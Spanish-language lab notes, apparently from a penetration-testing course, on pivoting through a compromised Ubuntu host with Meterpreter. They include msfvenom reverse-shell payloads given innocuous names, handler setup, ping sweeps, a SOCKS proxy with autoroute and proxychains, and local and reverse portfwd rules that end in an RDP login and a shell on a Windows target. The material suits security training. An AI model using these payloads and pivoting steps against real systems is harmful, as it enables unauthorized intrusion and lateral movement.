
## 1. Conceptos principales

Meterpreter permite realizar pivoting y redirección de puertos a través de una sesión comprometida, sin depender de los túneles SSH.

Las técnicas principales de esta sección son:

|Técnica|Función|
|---|---|
|Meterpreter Reverse Shell|Obtener una sesión Meterpreter en el host pivote.|
|`ping_sweep`|Descubrir hosts activos mediante ICMP.|
|SOCKS Proxy|Enrutar el tráfico de herramientas externas a través de Meterpreter.|
|`autoroute`|Añadir rutas hacia redes internas a través de una sesión Meterpreter.|
|`portfwd`|Redirigir puertos locales o inversos mediante Meterpreter.|

### Escenario del laboratorio

|Máquina|Dirección IP|Función|
|---|---|---|
|Atacante|`10.10.14.18`|Ejecuta Metasploit y las herramientas de enumeración.|
|Ubuntu|`10.129.202.64` / `172.16.5.129`|Host pivote con una sesión Meterpreter.|
|Windows A|`172.16.5.19`|Objetivo de la red interna.|

La red interna que se desea alcanzar es `172.16.5.0/23`.

## 2. Obtener una sesión Meterpreter en Ubuntu

Primero, generamos un payload para Linux x64 que se conectará al atacante mediante TCP.

### Generar el payload

```
msfvenom -p linux/x64/meterpreter/reverse_tcp \
LHOST=10.10.14.18 \
LPORT=8080 \
-f elf \
-o backupjob
```

Parámetros importantes:

- `LHOST`: dirección IP del atacante.
    
- `LPORT`: puerto al que se conectará el payload.
    
- `-f elf`: genera un ejecutable para Linux.
    
- `-o backupjob`: nombre del archivo generado.
    

### Configurar el handler

En Metasploit:

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

### Transferir y ejecutar el payload

Copiamos el archivo a Ubuntu mediante SSH:

```
scp backupjob ubuntu@<IP_UBUNTU>:~/
```

En Ubuntu:

```
chmod +x backupjob
./backupjob
```

Si la conexión funciona, Metasploit abrirá una sesión Meterpreter.

```
meterpreter > pwd
```

A partir de este momento, podemos utilizar Ubuntu como host pivote.

## 3. Descubrir equipos de la red interna

### 3.1. Barrido ICMP con Meterpreter

Podemos utilizar el módulo `ping_sweep` para comprobar qué hosts responden a las solicitudes ICMP.

```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

El tráfico se genera desde el host Ubuntu, que es el equipo que tiene acceso a la red interna.

### 3.2. Barrido ICMP en Linux

Desde una shell Linux en el host pivote:

```
for i in {1..254}; do
    (ping -c 1 172.16.5.$i | grep "bytes from" &) 
done
```

Este comando intenta enviar un paquete ICMP a las direcciones comprendidas entre `172.16.5.1` y `172.16.5.254`.

### 3.3. Barrido ICMP con CMD

Desde Windows:

```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### 3.4. Barrido ICMP con PowerShell

```
1..254 | % {"172.16.5.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.5.$($_) -Quiet)"}
```

**Importante:**

- Un firewall puede bloquear las solicitudes ICMP.
    
- Un host activo puede no responder a los pings.
    
- La caché ARP puede tardar en construirse; el material recomienda repetir el barrido al menos dos veces cuando no se obtienen respuestas inicialmente.
    
- La ausencia de respuestas ICMP no demuestra que un equipo esté apagado.

## 4. Crear un proxy SOCKS con Metasploit

Si ICMP está bloqueado o necesitamos utilizar herramientas como Nmap, podemos crear un proxy SOCKS y enrutar el tráfico mediante nuestra sesión Meterpreter.

### 4.1. Iniciar el servidor SOCKS

En Metasploit:

```
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 9050
set VERSION 4a
run
```

Este módulo crea un proxy SOCKS4a en el puerto `9050`.

Para comprobar que está ejecutándose:

```
jobs
```

Deberíamos ver un trabajo correspondiente a `auxiliary/server/socks_proxy`.

### 4.2. Configurar Proxychains

Editamos el archivo:

```
sudo nano /etc/proxychains.conf
```

Añadimos o modificamos la entrada correspondiente al proxy:

```
socks4 127.0.0.1 9050
```

Si se utiliza SOCKS5, la configuración debe coincidir con la versión del servidor SOCKS.

### 4.3. Añadir rutas con AutoRoute

El proxy SOCKS necesita una ruta hacia la red interna a través de la sesión Meterpreter.

Desde Metasploit:

```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

- `SESSION 1`: identificador de la sesión Meterpreter.
    
- `SUBNET`: red interna que queremos alcanzar.
    

El material muestra que el módulo puede advertir sobre una incompatibilidad con una sesión Linux, pero aun así añadir rutas detectadas en la tabla de enrutamiento del host pivote.

También podemos utilizar el comando desde Meterpreter:

```
run autoroute -s 172.16.5.0/23
```

Para consultar las rutas activas:

```
run autoroute -p
```

**Objetivo:** hacer que Metasploit conozca la ruta hacia la red interna a través de la sesión comprometida.

### 4.4. Escanear con Nmap a través de Proxychains

Una vez configurado el proxy y la ruta:

```
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

Parámetros:

|Parámetro|Función|
|---|---|
|`-p3389`|Escanea el puerto TCP 3389, utilizado habitualmente por RDP.|
|`-sT`|Utiliza un escaneo TCP Connect.|
|`-v`|Muestra información detallada.|
|`-Pn`|Omite el descubrimiento de hosts mediante ping.|
|`proxychains`|Encauza el tráfico a través del proxy configurado.|

Ejemplo de resultado:

```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

Esto indica que el puerto TCP 3389 está abierto en el objetivo.

**Nota:** al utilizar Proxychains, `-sT` es la opción adecuada para este tipo de escaneo TCP. Los escaneos SYN (`-sS`) no funcionan de la misma manera a través de un proxy SOCKS.

## 5. Redirección de puertos con `portfwd`

Meterpreter dispone del comando `portfwd` para crear reglas de redirección de puertos mediante una sesión activa.

### Consultar la ayuda

```
meterpreter > help portfwd
```

Operaciones disponibles:

|Operación|Función|
|---|---|
|`add`|Añade una regla de redirección.|
|`delete`|Elimina una regla.|
|`list`|Muestra las reglas existentes.|
|`flush`|Elimina todas las reglas de redirección.|

Parámetros principales:

|Parámetro|Función|
|---|---|
|`-l`|Puerto local de escucha en una redirección normal.|
|`-L`|Host local de escucha o destino local, según el tipo de redirección.|
|`-p`|Puerto remoto.|
|`-r`|Host remoto al que se redirige el tráfico.|
|`-R`|Activa la modalidad de redirección inversa.|
|`-i`|Índice de una regla existente.|

---

## 6. Crear una redirección local para acceder por RDP

Supongamos que queremos conectarnos al puerto RDP de Windows A (`172.16.5.19:3389`) a través de la sesión Meterpreter de Ubuntu.

Creamos la regla:

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

La regla establece la siguiente relación:

```
Atacante:3300
     |
     v
Sesión Meterpreter en Ubuntu
     |
     v
Windows A:3389
```

Ahora podemos conectarnos al servicio RDP utilizando el puerto local:

```
xfreerdp /v:localhost:3300 /u:<USUARIO> /p:'<CONTRASEÑA>'
```

Sustituye las credenciales por las correspondientes al laboratorio.

### Consultar las reglas

```
meterpreter > portfwd list
```

La redirección permite utilizar un servicio interno como si estuviera disponible a través del puerto local de nuestra máquina atacante.

## 7. Redirección inversa de puertos con Meterpreter

La redirección inversa permite que un servicio que recibe conexiones en el host pivote reenvíe esas conexiones hacia un listener del atacante.

En el ejemplo del material:

- Ubuntu escucha en el puerto `1234`.
    
- El atacante recibe la conexión en el puerto `8081`.
    
- Windows se conecta a `172.16.5.129:1234`.
    

### 7.1. Crear la regla inversa

Desde la sesión Meterpreter:

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

Interpretación:

|Parámetro|Valor|Función|
|---|---|---|
|`-R`|—|Activa la redirección inversa.|
|`-l`|`8081`|Puerto local del atacante al que se reenvía la conexión.|
|`-p`|`1234`|Puerto de escucha en el lado remoto.|
|`-L`|`10.10.14.18`|Dirección local del atacante.|

El material muestra la regla con el siguiente resultado:

```
[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

### 7.2. Configurar el handler

En Metasploit:

```
background
```

A continuación:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run
```

El handler queda esperando la conexión inversa en el puerto `8081`.

### 7.3. Generar el payload de Windows

El payload debe conectarse al puerto `1234` de Ubuntu, donde se recibirá la conexión antes de reenviarse al atacante.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=172.16.5.129 \
LPORT=1234 \
-f exe \
-o backupscript.exe
```

Observa la diferencia:

- **LHOST del payload:** IP interna de Ubuntu.
    
- **LPORT del payload:** `1234`.
    
- **Puerto del handler:** `8081`.
    
- **Puerto local del atacante definido en** `**portfwd**`**:** `8081`.
    

### 7.4. Flujo de la conexión

```
Windows A
172.16.5.19
     |
     | Conexión inversa a 172.16.5.129:1234
     v
Ubuntu — Host pivote
Puerto 1234
     |
     | Redirección inversa mediante Meterpreter
     v
Atacante
10.10.14.18:8081
     |
     v
Metasploit multi/handler
```

Si todo funciona correctamente, Metasploit recibirá una nueva sesión Meterpreter de Windows.

Para abrir una shell:

```
meterpreter > shell
```

## 8. Consultar conexiones con Netstat

Podemos utilizar `netstat` para revisar las conexiones TCP establecidas:

```
netstat -antp
```

En el ejemplo del material aparece una conexión local relacionada con el cliente RDP:

```
tcp  0  0 127.0.0.1:54652  127.0.0.1:3300  ESTABLISHED 4075/xfreerdp
```

Esto muestra que el proceso `xfreerdp` tiene una conexión TCP establecida con el puerto local `3300`, que corresponde a la redirección configurada.

Desde una perspectiva defensiva, revisar las conexiones de red puede ayudar a identificar comunicaciones sospechosas en un equipo.

## 9. Diferencias entre SOCKS, AutoRoute y Portfwd

|Técnica|Uso principal|Ejemplo|
|---|---|---|
|SOCKS + AutoRoute|Enrutar el tráfico de herramientas externas hacia una red interna.|`proxychains nmap ...`|
|`portfwd` local|Acceder a un servicio interno mediante un puerto local.|`localhost:3300` → `172.16.5.19:3389`|
|`portfwd -R`|Reenviar conexiones recibidas en el lado remoto hacia un listener local.|`172.16.5.129:1234` → `10.10.14.18:8081`|

### ¿Cuándo utilizar cada técnica?

- **SOCKS + AutoRoute:** cuando necesitas enumerar varios servicios o utilizar herramientas como Nmap a través del pivote.
    
- **Portfwd local:** cuando necesitas conectarte a un servicio específico de la red interna, como RDP.
    
- **Portfwd inverso:** cuando el objetivo debe establecer una conexión inversa, pero no puede alcanzar directamente al atacante.

## 10. Flujo de trabajo para el laboratorio

1. Obtener una sesión Meterpreter en Ubuntu.
    
2. Identificar la red interna que se desea alcanzar.
    
3. Realizar un barrido ICMP si la red permite solicitudes de ping.
    
4. Configurar un proxy SOCKS si necesitas utilizar herramientas externas.
    
5. Añadir la ruta hacia la red interna mediante AutoRoute.
    
6. Configurar Proxychains y verificar el acceso con Nmap.
    
7. Utilizar `portfwd` para acceder a un servicio concreto, como RDP.
    
8. Si necesitas una conexión inversa, configurar `portfwd -R` y el handler correspondiente.
    
9. Comprobar las conexiones y sesiones recibidas.
    

## Puntos clave para el examen

- Meterpreter permite pivotar sin depender exclusivamente de SSH.
    
- `ping_sweep` permite descubrir hosts que responden a ICMP.
    
- SOCKS proporciona un punto de entrada para enrutar tráfico de otras herramientas.
    
- AutoRoute añade rutas hacia redes internas a través de una sesión Meterpreter.
    
- Proxychains permite ejecutar herramientas como Nmap utilizando el proxy SOCKS.
    
- `-Pn` evita que Nmap dependa del descubrimiento de hosts mediante ping.
    
- `portfwd add -l ... -p ... -r ...` crea una redirección local hacia un servicio remoto.
    
- `portfwd add -R ...` configura una redirección inversa.
    
- En una redirección inversa, **la IP y el puerto a los que se conecta el payload pueden ser distintos de la IP y el puerto donde escucha el handler**.
    
- El puerto local de una redirección no tiene por qué coincidir con el puerto del servicio de destino.
